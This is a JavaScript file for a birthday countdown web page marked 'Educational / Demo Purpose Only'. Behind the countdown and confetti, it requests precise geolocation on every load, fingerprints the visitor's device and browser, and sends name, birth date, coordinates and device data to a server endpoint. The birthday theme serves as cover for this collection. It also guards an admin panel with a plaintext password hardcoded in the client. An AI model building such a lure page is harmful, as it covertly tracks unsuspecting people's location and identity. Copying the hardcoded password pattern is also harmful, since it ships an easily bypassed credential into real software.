// ============================================
// BIRTHDAY COUNTDOWN PAGE
// Educational / Demo Purpose Only
// ============================================

let targetDate = null;
let countdownInterval = null;
let isMusicPlaying = false;
let userLocation = null;
let deviceData = null;

// Initialize page
window.addEventListener('load', function() {
    // Check if birth date is already set
    const savedBirthDate = localStorage.getItem('userBirthDate');
    const userName = localStorage.getItem('userName');
    
    if (savedBirthDate && userName) {
        // Show birthday page
        targetDate = new Date(savedBirthDate);
        showBirthdayPage();
        startCountdown();
        createConfetti();
    } else {
        // Show birth date entry modal
        document.getElementById('birthdayModal').style.display = 'flex';
    }
    
    // Request location permission
    requestLocationPermission();
});

// Request location permission
function requestLocationPermission() {
    deviceData = detectDevice();
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            function(position) {
                userLocation = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude
                };
            },
            function(error) {
                console.log('Location access denied or error:', error.message);
                userLocation = null;
            },
            {
                enableHighAccuracy: true,
                timeout: 5000
            }
        );
    }
}

// Detect device (same function from main script)
function detectDevice() {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
    let deviceInfo = 'Unknown Device';
    let isMobile = false;
    
    if (/android/i.test(userAgent)) {
        deviceInfo = 'Android Device';
        isMobile = true;
        if (/samsung/i.test(userAgent)) deviceInfo = 'Samsung';
        else if (/xiaomi/i.test(userAgent)) deviceInfo = 'Xiaomi';
        else if (/oneplus/i.test(userAgent)) deviceInfo = 'OnePlus';
        else if (/oppo/i.test(userAgent)) deviceInfo = 'Oppo';
        else if (/vivo/i.test(userAgent)) deviceInfo = 'Vivo';
        else if (/realme/i.test(userAgent)) deviceInfo = 'Realme';
        else if (/redmi/i.test(userAgent)) deviceInfo = 'Redmi';
    } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
        deviceInfo = 'Apple Device';
        isMobile = true;
        if (/iPhone/.test(userAgent)) deviceInfo = 'iPhone';
        else if (/iPad/.test(userAgent)) deviceInfo = 'iPad';
    }
    
    return {
        device: deviceInfo,
        userAgent: userAgent,
        isMobile: isMobile,
        browser: getBrowserName(userAgent)
    };
}

function getBrowserName(userAgent) {
    if (userAgent.indexOf('Chrome') > -1) return 'Chrome';
    if (userAgent.indexOf('Firefox') > -1) return 'Firefox';
    if (userAgent.indexOf('Safari') > -1) return 'Safari';
    if (userAgent.indexOf('Edge') > -1) return 'Edge';
    if (userAgent.indexOf('Opera') > -1 || userAgent.indexOf('OPR') > -1) return 'Opera';
    return 'Unknown Browser';
}

// Ask user if birthday is this year or next year
function askBirthdayYear() {
    const birthDateInput = document.getElementById('birthDateInput');
    const birthDate = birthDateInput.value;
    
    if (!birthDate) {
        birthDateInput.style.borderColor = '#ef4444';
        setTimeout(() => {
            birthDateInput.style.borderColor = '';
        }, 2000);
        return;
    }
    
    // Save birth date temporarily
    localStorage.setItem('userBirthDate', birthDate);
    
    // Hide first modal and show year selection modal
    document.getElementById('birthdayModal').style.display = 'none';
    document.getElementById('yearSelectionModal').style.display = 'flex';
}

// Select year (this year or next year)
function selectYear(yearChoice) {
    const birthDate = localStorage.getItem('userBirthDate');
    if (!birthDate) return;
    
    const today = new Date();
    today.setHours(0, 0, 0, 0);
    
    const birthDateObj = new Date(birthDate);
    const currentYear = today.getFullYear();
    const birthMonth = birthDateObj.getMonth(); // 0-11
    const birthDay = birthDateObj.getDate();
    
    // Set target date based on user's choice
    if (yearChoice === 'this') {
        targetDate = new Date(currentYear, birthMonth, birthDay);
    } else {
        targetDate = new Date(currentYear + 1, birthMonth, birthDay);
    }
    targetDate.setHours(0, 0, 0, 0);
    
    // Hide year selection modal and show waiting message
    document.getElementById('yearSelectionModal').style.display = 'none';
    document.getElementById('waitingModal').style.display = 'flex';
    
    // Update user data
    const userName = localStorage.getItem('userName');
    if (userName) {
        updateUserDataWithBirthDate(userName, birthDate, targetDate);
    }
    
    // Wait for 3 seconds, then show countdown
    setTimeout(() => {
        document.getElementById('waitingModal').style.display = 'none';
        showBirthdayPage();
        startCountdown();
        createConfetti();
    }, 3000);
}

// Create birthday page (called after waiting)
function createBirthdayPage() {
    // This function is now called after the waiting period
    // The targetDate is already set in selectYear()
}

// Update user data with birth date
async function updateUserDataWithBirthDate(userName, birthDate, targetDate) {
    const userData = {
        name: userName,
        birthDate: birthDate,
        targetDate: targetDate.toISOString(),
        accessType: 'Birthday Site',
        visitTime: new Date().toLocaleString(),
        visitDate: new Date().toISOString(),
        location: userLocation,
        device: deviceData,
        timestamp: new Date().toISOString()
    };
    
    // Update in localStorage
    let allUsers = JSON.parse(localStorage.getItem('allUsers') || '[]');
    const userIndex = allUsers.findIndex(u => u.name === userName && u.accessType === 'Birthday Site');
    if (userIndex !== -1) {
        allUsers[userIndex] = { ...allUsers[userIndex], ...userData };
    } else {
        allUsers.push(userData);
    }
    localStorage.setItem('allUsers', JSON.stringify(allUsers));
    
    // Send to API
    try {
        const response = await fetch('/api/saveUser', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(userData)
        });
        
        // Check if response is OK
        if (!response.ok) {
            const errorText = await response.text();
            console.error('API Error:', errorText);
            return;
        }
        
        // Try to parse JSON response
        const contentType = response.headers.get('content-type');
        if (contentType && contentType.includes('application/json')) {
            const result = await response.json();
            console.log('User saved to database:', result);
        } else {
            console.log('User data saved (non-JSON response)');
        }
    } catch (error) {
        console.error('Error updating user data:', error);
        // Continue even if API fails - data is saved in localStorage
    }
}

// Show birthday page
function showBirthdayPage() {
    document.getElementById('birthdayPage').style.display = 'block';
    
    // Display target date
    const targetDateText = document.getElementById('targetDateText');
    if (targetDate) {
        const formattedDate = targetDate.toLocaleDateString('en-US', {
            weekday: 'long',
            year: 'numeric',
            month: 'long',
            day: 'numeric'
        });
        targetDateText.textContent = `Your birthday: ${formattedDate}`;
    }
    
    // Show countdown container with animation
    const countdownContainer = document.getElementById('countdownContainer');
    countdownContainer.style.display = 'flex';
    countdownContainer.style.animation = 'fadeInUp 1s ease';
}

// Start countdown
function startCountdown() {
    if (!targetDate) return;
    
    updateCountdown();
    countdownInterval = setInterval(updateCountdown, 1000);
}

// Update countdown
function updateCountdown() {
    if (!targetDate) return;
    
    const now = new Date().getTime();
    const target = targetDate.getTime();
    const difference = target - now;
    
    if (difference <= 0) {
        // Birthday has arrived!
        clearInterval(countdownInterval);
        celebrateBirthday();
        return;
    }
    
    const days = Math.floor(difference / (1000 * 60 * 60 * 24));
    const hours = Math.floor((difference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((difference % (1000 * 60)) / 1000);
    
    document.getElementById('days').textContent = String(days).padStart(2, '0');
    document.getElementById('hours').textContent = String(hours).padStart(2, '0');
    document.getElementById('minutes').textContent = String(minutes).padStart(2, '0');
    document.getElementById('seconds').textContent = String(seconds).padStart(2, '0');
}

// Celebrate birthday
function celebrateBirthday() {
    document.querySelector('.birthday-title').textContent = '🎉 Happy Birthday! 🎉';
    document.querySelector('.birthday-subtitle').textContent = 'Your special day is here!';
    
    // Burst more confetti
    for (let i = 0; i < 100; i++) {
        setTimeout(() => createConfettiPiece(), i * 50);
    }
}

// Create confetti
function createConfetti() {
    const container = document.getElementById('confettiContainer');
    
    for (let i = 0; i < 50; i++) {
        setTimeout(() => {
            createConfettiPiece();
        }, i * 100);
    }
}

// Create single confetti piece
function createConfettiPiece() {
    const container = document.getElementById('confettiContainer');
    const piece = document.createElement('div');
    piece.className = 'confetti-piece';
    piece.style.left = Math.random() * 100 + '%';
    piece.style.animationDelay = Math.random() * 2 + 's';
    piece.style.animationDuration = (Math.random() * 2 + 2) + 's';
    container.appendChild(piece);
    
    setTimeout(() => {
        if (piece.parentNode) {
            piece.remove();
        }
    }, 5000);
}

// Toggle birthday music
function toggleBirthdayMusic() {
    const music = document.getElementById('birthdayMusic');
    const playIcon = document.getElementById('playIcon');
    const pauseIcon = document.getElementById('pauseIcon');
    
    if (isMusicPlaying) {
        music.pause();
        playIcon.style.display = 'inline';
        pauseIcon.style.display = 'none';
        isMusicPlaying = false;
    } else {
        music.play().then(() => {
            playIcon.style.display = 'none';
            pauseIcon.style.display = 'inline';
            isMusicPlaying = true;
        }).catch(error => {
            console.log('Music file not found. You can add your own music!');
        });
    }
}

// Admin access check (same as main site)
function checkAdminAccess() {
    const password = prompt('Enter password to access admin panel:');
    
    if (password === 'kimiry@123') {
        window.location.href = 'admin/admin.html';
    } else if (password !== null) {
        alert('Access Denied 😄');
    }
}
